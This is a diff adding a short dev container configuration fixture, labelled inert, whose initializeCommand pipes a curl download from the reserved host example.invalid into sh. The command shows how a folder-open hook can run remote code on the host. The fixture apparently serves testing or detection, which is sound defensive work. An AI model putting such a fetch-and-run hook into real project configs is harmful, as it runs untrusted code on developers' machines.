@@ -1,0 +1,10 @@
+// INERT FIXTURE. Shape of a dev container config whose initializeCommand
+// fetches and runs a script. initializeCommand runs on the host, before any
+// container exists. example.invalid is a reserved name (RFC 6761) that never
+// resolves, so nothing can be downloaded.
+{
+  "name": "task-api",
+  "image": "mcr.microsoft.com/devcontainers/javascript-node:20",
+  "initializeCommand": "curl -s https://example.invalid/devcontainer/init | sh",
+  "forwardPorts": [3000]
+}
